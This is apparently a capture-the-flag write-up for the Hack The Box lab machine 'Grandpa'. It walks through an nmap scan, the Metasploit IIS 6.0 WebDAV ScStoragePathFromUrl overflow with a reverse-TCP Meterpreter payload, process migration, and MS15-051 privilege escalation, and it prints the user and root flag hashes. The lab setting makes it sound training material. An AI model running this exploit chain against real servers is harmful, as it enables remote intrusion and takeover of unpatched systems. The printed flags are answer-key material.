# Grandpa
#### 10.10.10.14
###### Solved by: Dotaplayer365 and revdev


```{r, engine='bash', count_lines}
nmap -T4 -A -v 10.10.10.14

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Thu, 19 Oct 2017 15:38:04 GMT
|   WebDAV type: Unkown
|   Server Type: Microsoft-IIS/6.0
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK

```

The website shows "Under Construction"

![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Grandpa/images/Website.PNG "Website")

We try visiting some webpages and we get something like this

![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Grandpa/images/index.aspx.PNG "index.aspx")


Information we have so far:
* IIS 6.0

Searching exploits for IIS 6.0 

```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Machines/Grandpa# searchsploit IIS 6.0 | grep -v "5.0"
--------------------------------------------------------------- ----------------------------------
 Exploit Title                                                 |  Path
                                                               | (/usr/share/exploitdb/platforms/)
--------------------------------------------------------------- ----------------------------------
Microsoft IIS 6.0 - /AUX / '.aspx' Remote Denial of Service    | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow (Stack Exhaustion) Deni | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)    | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch | windows/remote/8754.patch
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)  | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)    | windows/remote/8806.pl
Microsoft IIS 6.0 / 7.5 (+ PHP) - Multiple Vulnerabilities     | windows/remote/19033.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Buffer Overf | windows/remote/41738.py
--------------------------------------------------------------- ----------------------------------
```

'ScStoragePathFromUrl' exploit :
>Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.

We already know from nmap that the PROPFIND request is supported. So it would'nt be a long shot to try this one out.

```{r, engine='bash', count_lines}
msf > search ScStoragePathFromUrl

Matching Modules
================

   Name                                                 Disclosure Date  Rank    Description
   ----                                                 ---------------  ----    -----------
   exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual   Microsoft IIS WebDav ScStoragePathFromUrl Overflow

```

_Perfect!_

So we would be using something like this

```{r, engine='bash', count_lines}
Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST          10.10.10.14      yes       The target address
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.248     yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
```

And there you have it!!

Easier than expected
```{r, engine='bash', count_lines}
msf exploit(iis_webdav_scstoragepathfromurl) > exploit
[*] Started reverse TCP handler on 10.10.14.248:4444 
[*] Sending stage (171583 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.248:4444 -> 10.10.10.14:1036) at 2017-10-15 23:25:52 +0530
meterpreter > 
```

When we try to go into the users directory, it gives us "Access Denied"

Looks like Priv esc should give us both the flags.

Time to go huntin.


The first thing we try is using the exploit suggester

Not a single exploit is working!!!!!

![Alt test](https://media.giphy.com/media/xT5LMWJSXHRbSusYve/giphy.gif "DOH!")

After some enumeration we see that there are a couple of processes running under NT AUTHORITY 

Maybe if we go to that process and then run our exploits!

```{r, engine='bash', count_lines}
meterpreter > ps

Process List
============

 PID   PPID  Name              Arch  Session  User                          Path
 ---   ----  ----              ----  -------  ----                          ----
...                                                  
 1172  388   inetinfo.exe                                                   
 1212  388   svchost.exe                                                    
 1436  1500  w3wp.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 1500  388   svchost.exe                                                    
 1588  388   svchost.exe                                                    
 1668  1752  rundll32.exe      x86   0                                      C:\WINDOWS\system32\rundll32.exe
 1672  388   alg.exe                                                        
 1820  588   davcdata.exe      x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 1992  1436  rundll32.exe      x86   0                                      C:\WINDOWS\system32\rundll32.exe
...                                            
```

Lets migrate into that process

```{r, engine='bash', count_lines}
meterpreter > migrate 1820
[*] Migrating from 1668 to 1820...
[*] Migration completed successfully.
```

Time to use the exploit suggester!!!

```
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

After trying a few of the suggested exploits, this one worked
```{r, engine='bash', count_lines}
msf exploit(ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.248     yes       The listen address
   LPORT     4443             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86
   
   
msf exploit(ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.14.248:4443 
[*] Launching notepad to host the exploit...
[+] Process 2564 launched.
[*] Reflectively injecting the exploit DLL into 2564...
[*] Injecting exploit into 2564...
[*] Exploit injected. Injecting payload into 2564...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (171583 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.248:4443 -> 10.10.10.14:1041) at 2017-10-15 23:36:44 +0530
meterpreter > 
```

![Alt test](https://media.giphy.com/media/nXxOjZrbnbRxS/giphy.gif "index.aspx")


**user.txt**
```{r, engine='bash', count_lines}
C:\Documents and Settings\Harry\Desktop>type user.txt
type user.txt
bdff5ec67c3cff017f2bedc146a5d869
```


**root.txt**
```{r, engine='bash', count_lines}
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
9359e905a2c35f861f6a57cecf28bb7b
```

